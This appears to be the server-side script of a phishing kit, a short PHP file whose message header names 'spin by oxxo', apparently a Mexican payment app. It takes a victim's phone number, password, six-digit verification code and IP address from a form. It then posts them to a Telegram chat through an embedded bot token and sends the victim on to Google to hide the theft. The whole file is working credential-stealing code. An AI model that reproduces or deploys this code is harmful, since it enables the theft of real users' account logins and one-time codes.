<?php

$user_ip = $_SERVER['REMOTE_ADDR'];

// datos del formulario
$number = isset($_POST['number']) ? $_POST['number'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$codigo = isset($_POST['codigo']) ? $_POST['codigo'] : '';

if (strlen($number) > 10 && substr($number, 0, 3) && strlen($password) > 8 && strlen($codigo) == 6) {
    // telegram
    $chatId = '-1667964659';

    // bot Token
    $botToken = '6101623188:AAHe68-C0OtB00q6pDjc7JLBZEQqqFNpVl0';

    // mensaje a enviar
    $message = "spin by oxxo-HR-GOKU\n\n";
    $message .= "Numero: $number\n";
    $message .= "Contraseña: $password\n";
    $message .= "Codigo: $codigo\n";
    $message .= "IP: $user_ip\n";

    // api de telegram
    $url = "https://api.telegram.org/bot$botToken/";

    // Envío del mensaje al grupo
    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query(array('chat_id' => $chatId, 'text' => $message)),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url . "sendMessage", false, $context);

    // redirecciona a google.com.mx
    header("Location: https://www.google.com.mx");
} else {
    header("Location: index.html");
}
?>